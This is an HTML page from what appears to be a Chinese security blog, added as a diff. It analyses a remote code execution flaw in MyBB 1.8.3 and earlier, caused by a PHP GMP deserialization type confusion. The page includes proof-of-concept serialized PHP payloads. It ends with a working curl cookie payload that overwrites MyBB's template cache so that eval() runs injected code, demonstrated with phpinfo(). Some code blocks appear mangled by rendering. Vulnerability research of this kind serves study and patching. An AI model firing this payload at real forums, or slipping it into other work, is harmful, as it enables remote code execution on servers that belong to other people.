@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="MyBB&lt;&#x3D;1.8.3 RCE一、漏洞简介在使用精心编制的对象的__wakeup()魔术方法进行GMP反序列化时发现了一个类型混淆漏洞，该漏洞可被滥用来更新分配给已创建对象的任何属性，进而触发严重的安全问题。 二、漏洞影响PHP 5.6 &lt; 5.6.30 MyBB&lt;&#x3D;1.8.3 三、复现过程漏洞分析gmp.c static int gmp_unserialize(zval **o">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/MyBB/MyBB%20_=%201.8.3%20rce%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="MyBB&lt;&#x3D;1.8.3 RCE一、漏洞简介在使用精心编制的对象的__wakeup()魔术方法进行GMP反序列化时发现了一个类型混淆漏洞，该漏洞可被滥用来更新分配给已创建对象的任何属性，进而触发严重的安全问题。 二、漏洞影响PHP 5.6 &lt; 5.6.30 MyBB&lt;&#x3D;1.8.3 三、复现过程漏洞分析gmp.c static int gmp_unserialize(zval **o">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-07-08T06:25:59.811Z">
+<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-MyBB/MyBB _= 1.8.3 rce漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/MyBB/MyBB%20_=%201.8.3%20rce%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:59.811Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MyBB-lt-1-8-3-RCE"><a href="#MyBB-lt-1-8-3-RCE" class="headerlink" title="MyBB&lt;=1.8.3 RCE"></a>MyBB&lt;=1.8.3 RCE</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>在使用精心编制的对象的<code>__wakeup()</code>魔术方法进行GMP反序列化时发现了一个类型混淆漏洞，该漏洞可被滥用来更新分配给已创建对象的任何属性，进而触发严重的安全问题。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>PHP 5.6 &lt; 5.6.30</p>
+<p>MyBB&lt;=1.8.3</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>gmp.c</p>
+<pre><code>static int gmp_unserialize(zval **object, zend_class_entry *ce, const unsigned char *buf, zend_uint buf_len, zend_unserialize_data *data TSRMLS_DC) /* &#123;&#123;&#123; */
+    &#123;
+        ...
+        ALLOC_INIT_ZVAL(zv_ptr);
+        if (!php_var_unserialize(&zv_ptr, &p, max, &unserialize_data TSRMLS_CC)
+            || Z_TYPE_P(zv_ptr) != IS_ARRAY
+        ) &#123;
+            zend_throw_exception(NULL, "Could not unserialize properties", 0 TSRMLS_CC);
+            goto exit;
+        &#125;
+
+        if (zend_hash_num_elements(Z_ARRVAL_P(zv_ptr)) != 0) &#123;
+            zend_hash_copy(
+                zend_std_get_properties(*object TSRMLS_CC), Z_ARRVAL_P(zv_ptr),
+                (copy_ctor_func_t) zval_add_ref, NULL, sizeof(zval *)
+            );
+        &#125;
+
+zend\_object\_handlers.c
+
+    ZEND_API HashTable *zend_std_get_properties(zval *object TSRMLS_DC) /* &#123;&#123;&#123; */
+    &#123;
+        zend_object *zobj;
+        zobj = Z_OBJ_P(object);
+        if (!zobj->properties) &#123;
+            rebuild_object_properties(zobj);
+        &#125;
+        return zobj->properties;
+    &#125;
+
+攻击者可以将`**object`更改为整数类型或bool类型的ZVAL，然后攻击者将能够通过`Z_OBJ_P`访问存储在对象库中的任何对象。这意味着攻击者将能够通过`zend_hash_copy()`更新对象中的任何属性。从而引发了一系列安全问题。
+
+下面这段代码可以验证这个漏洞
+
+    <?php
+
+    class obj
+    &#123;
+        var $ryat;
+
+        function __wakeup()
+        &#123;
+            $this->ryat = 1;
+        &#125;
+    &#125;
+
+    $obj = new stdClass;
+    $obj->aa = 1;
+    $obj->bb = 2;
+
+    $inner = 's:1:"1";a:3:&#123;s:2:"aa";s:2:"hi";s:2:"bb";s:2:"hi";i:0;O:3:"obj":1:&#123;s:4:"ryat";R:2;&#125;&#125;&#39;;
+$exploit = &#39;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#39;.strlen($inner).&#39;:&#123;&#39;.$inner.&#39;&#125;&#125;&#39;;
+$x = unserialize($exploit);
+var_dump($obj);
+
+?&gt;
+</code></pre>
+<p>预期结果:</p>
+<pre><code>object(stdClass)#1 (2) &#123;
+  [&quot;aa&quot;]=&gt;
+  int(1)
+  [&quot;bb&quot;]=&gt;
+  int(2)
+&#125;
+</code></pre>
+<p>实际结果:</p>
+<pre><code>object(stdClass)#1 (3) &#123;
+  [&quot;aa&quot;]=&gt;
+  string(2) &quot;hi&quot;
+  [&quot;bb&quot;]=&gt;
+  string(2) &quot;hi&quot;
+  [0]=&gt;
+  object(obj)#3 (1) &#123;
+    [&quot;ryat&quot;]=&gt;
+    &amp;int(1)
+  &#125;
+&#125;
+</code></pre>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在<code>php 5.6&lt;=5.6.11</code>中，DateInterval的<code>__wakeup()</code>使用<code>convert_to_long()</code>句柄并重新分配其属性，因此攻击者可以通过GMP的<code>gmp_cast_object()</code>将GMP对象转换成任何整数类型的ZVAL:</p>
+<pre><code>static int gmp_cast_object(zval *readobj, zval *writeobj, int type TSRMLS_DC) /* &#123;&#123;&#123; */
+    &#123;
+        mpz_ptr gmpnum;
+        switch (type) &#123;
+        ...
+        case IS_LONG:
+            gmpnum = GET_GMP_FROM_ZVAL(readobj);
+            INIT_PZVAL(writeobj);
+            ZVAL_LONG(writeobj, mpz_get_si(gmpnum));
+            return SUCCESS;
+
+漏洞利用代码
+
+    <?php
+
+    var_dump(unserialize('a:2:&#123;i:0;C:3:"GMP":17:&#123;s:4:"1234";a:0:&#123;&#125;&#125;i:1;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#39;));
+
+?&gt;
+</code></pre>
+<p>当然，也可以套用精心编制的<code>__wakeup()</code></p>
+<pre><code>&lt;?php
+
+function __wakeup()
+&#123;
+    $this-&gt;ryat = (int) $this-&gt;ryat;
+&#125;
+
+?&gt;
+</code></pre>
+<h4 id="MyBB-lt-1-8-3"><a href="#MyBB-lt-1-8-3" class="headerlink" title="MyBB &lt;= 1.8.3"></a>MyBB &lt;= 1.8.3</h4><p>index.php</p>
+<pre><code>if(isset($mybb-&gt;cookies[&#39;mybb&#39;][&#39;forumread&#39;]))
+    &#123;
+        $forumsread = my_unserialize($mybb-&gt;cookies[&#39;mybb&#39;][&#39;forumread&#39;]);
+    &#125;
+</code></pre>
+<p>MyBB&lt;=1.8.3允许通过<code>unserialize()</code>反序列化cookie，因此攻击者能够更新<code>$mybb</code>或其他对象的属性，从而很容易导致安全问题，例如：XSS、SQL注入、RCE等<br>好消息是该漏洞已经在新版本得到了修复</p>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>MyBB &lt;= 1.8.3 RCE漏洞</p>
+<p>index.php</p>
+<pre><code>eval(&#39;$index = &quot;&#39;.$templates-&gt;get(&#39;index&#39;).&#39;&quot;;&#39;);
+</code></pre>
+<p>MyBB在模板解析过程中始终使用eval()函数。 inc/class_templates.php</p>
+<pre><code>class templates
+&#123;
+    ...
+    public $cache = array();
+    ...
+    function get($title, $eslashes=1, $htmlcomments=1)
+    &#123;
+        global $db, $theme, $mybb;
+        ...
+        $template = $this-&gt;cache[$title];
+        ...
+        return $template;
+    &#125;
+</code></pre>
+<p>如果我们可以控制<code>$cache</code>，我们就可以通过<code>eval()</code>函数注入php代码。<br>inc/init.php</p>
+<pre><code>$error_handler = new errorHandler();
+...
+$maintimer = new timer();
+...
+$mybb = new MyBB;
+...
+switch($config[&#39;database&#39;][&#39;type&#39;])
+&#123;
+    case &quot;sqlite&quot;:
+        $db = new DB_SQLite;
+        break;
+    case &quot;pgsql&quot;:
+        $db = new DB_PgSQL;
+        break;
+    case &quot;mysqli&quot;:
+        $db = new DB_MySQLi;
+        break;
+    default:
+        $db = new DB_MySQL;
+&#125;
+...
+$templates = new templates;
+</code></pre>
+<p><code>$templates</code>对象在<code>init.php</code>中实例化，并且在此之前实例化了四个对象。这意味着<code>$templates</code>对象的句柄被设置为5并存储到对象存储中，因此我们可以访问<code>$templates</code>对象并通过在GMP反序列化期间将GMP对象转换为整型ZVAL(其值为5)来更新<code>$cache</code>属性。这也表明我们可以通过eval()函数注入php代码。</p>
+<p>当MyBB&lt;=1.8.3和PHP5.6&lt;=5.6.11时，只需在命令行上使用curl即可触发RCE：</p>
+<pre><code>curl --cookie &#39;mybb[forumread]=a:1:&#123;i:0%3bC:3:&quot;GMP&quot;:106:&#123;s:1:&quot;5&quot;%3ba:2:&#123;s:5:&quot;cache&quot;%3ba:1:&#123;s:5:&quot;index&quot;%3bs:14:&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;%3b&#125;i:0%3bO:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;%3bR:2%3b&#125;&#125;&#125;&#125;&#39; http://0-sec.org/mybb
+</code></pre>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/MyBB/MyBB%20_=%201.8.3%20rce%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qsp000buy8v1hqmiaixd" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/MyBB/MyBB%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Mssql/Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
